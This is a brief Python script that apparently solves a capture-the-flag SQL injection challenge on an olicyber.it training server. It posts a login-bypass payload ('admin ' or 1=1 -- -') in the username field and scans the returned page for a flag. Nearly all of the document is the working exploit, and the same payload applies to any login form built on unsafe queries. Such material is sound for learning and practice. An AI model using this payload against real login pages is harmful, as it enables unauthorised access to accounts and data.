import requests

url = 'http://basic-sqli.challs.olicyber.it/'
payload = {"username":"admin ' or 1=1 -- -", "password":"whatever"}

html = requests.post(url, data=payload).text

for line in html.splitlines():
    if "flag{" in line.lower():
        print("flag:\n", line)
